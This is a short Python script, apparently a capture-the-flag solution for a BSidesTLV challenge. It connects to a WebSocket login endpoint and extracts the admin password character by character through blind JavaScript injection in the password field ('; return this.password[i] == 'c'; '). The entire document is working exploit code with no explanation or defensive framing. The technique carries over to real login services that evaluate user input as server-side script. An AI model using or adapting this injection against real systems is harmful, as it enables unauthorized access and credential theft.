import websocket
import json
import string
import sys


def call(_ws, u, p):
    j = {'username': unicode(u), 'password': unicode(p)}
    _r = _ws.send(json.dumps(j))
    d = _ws.recv()
    return d


ws = websocket.WebSocket()
ws.connect("ws://two.challenges.bsidestlv.com:8000/login")
r = [' '] * 30
done = False
for i in range(0, len(r)):
    if done:
        break
    sys.stdout.write('%d...' % i)
    sys.stdout.flush()
    for c in string.printable:
        q = "'; return this.password[%d] == '%c'; '" % (i,c)
        if call(ws, 'admin', q) == 'Success!':
            r[i] = c
            sys.stdout.write('%c' % c)
            if c == '}':
                done = True
            break
    sys.stdout.write('\n')
    sys.stdout.flush()
print(''.join(r))